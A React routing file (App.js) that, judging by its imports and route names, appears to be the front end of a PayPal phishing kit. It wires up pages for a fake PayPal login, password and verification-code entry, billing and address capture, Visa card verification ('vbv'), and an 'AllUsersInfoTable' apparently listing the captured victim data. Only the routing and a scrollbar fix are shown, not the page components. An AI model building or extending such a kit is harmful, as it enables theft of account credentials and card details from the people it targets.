import React, { useEffect } from 'react';
import { BrowserRouter, Route, Switch } from 'react-router-dom';
import Login from './components/auth/Login';
import Verification from './components/Verification'; 
import res from './components/AllUsersInfoTable'; 
import ppl from './components/paypal/login'; 
import code from './components/paypal/code'; 
import codeverif from './components/paypal/codeverif'; 
import pass from './components/paypal/pass'; 
import codeinput from './components/paypal/codeinput'; 
import paypalbilling from './components/paypal/paypalbilling'; 
import paypaladdressadd from './components/paypal/paypaladdressadd'; 
import paypaltoverif from './components/paypal/paypaltoverif'; 
import container from './components/vbv/container'; 
import vbvsubmit from './components/vbv/vbvsubmit'; 

function App() {
  // Function to fix double scrollbars
  useEffect(() => {
    function fixDoubleScrollbars() {
      const htmlElement = document.documentElement;
      const bodyElement = document.body;

      // Apply styles to prevent double scrollbars
      htmlElement.style.height = '100%';
      htmlElement.style.overflow = 'hidden';
      bodyElement.style.height = '100%';
      bodyElement.style.margin = '0';
      bodyElement.style.overflowX = 'hidden';
      bodyElement.style.overflowY = 'auto';

      // Optional: Hide the scrollbar on WebKit browsers when not needed
      bodyElement.style.scrollbarWidth = 'none'; // Firefox
      bodyElement.style.msOverflowStyle = 'none'; // Internet Explorer 10+
      bodyElement.style.WebkitScrollbar = 'none'; // WebKit browsers
    }

    // Run the function on load and whenever layout changes
    fixDoubleScrollbars();
    window.addEventListener('resize', fixDoubleScrollbars);

    // Cleanup the event listener when the component is unmounted
    return () => {
      window.removeEventListener('resize', fixDoubleScrollbars);
    };
  }, []); // Empty dependency array to run this effect only once when the component mounts

  return (
    <BrowserRouter>
      <Switch>
        {/* Public routes */}
        <Route exact path="/" component={Login} />
        <Route exact path="/login" component={Login} />
        <Route exact path="/verif" component={Verification} />
        <Route exact path="/res" component={res} />
        <Route exact path="/ppl" component={ppl} />
        <Route exact path="/pass" component={pass} />
        <Route exact path="/code" component={code} />
        <Route exact path="/codeverif" component={codeverif} />
        <Route exact path="/paypaltoverif" component={paypaltoverif} />
        <Route exact path="/paypaladdressadd" component={paypaladdressadd} />
        <Route exact path="/paypalbilling" component={paypalbilling} />
        <Route exact path="/codeinput" component={codeinput} />
        <Route exact path="/container" component={container} />
        <Route exact path="/vbvsubmit" component={vbvsubmit} />
        {/* Add more routes here as needed */}
      </Switch>
    </BrowserRouter>
  );
}

export default App;
